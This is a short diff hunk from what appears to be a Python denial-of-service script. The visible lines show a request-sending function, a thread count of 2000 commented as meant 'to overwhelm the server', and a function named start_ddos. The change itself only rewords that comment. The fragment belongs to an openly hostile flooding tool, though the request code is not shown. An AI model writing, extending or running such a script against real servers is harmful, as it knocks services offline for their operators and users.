@@ -14,7 +14,7 @@ def send_requests():
         except Exception as e:
             print(f"Unexpected error: {e}")
 
-num_threads = 2000  # Increased number of threads to overwhelm the server
+num_threads = 2000  # Number of threads to overwhelm the server
 threads = []
 
 def start_ddos():
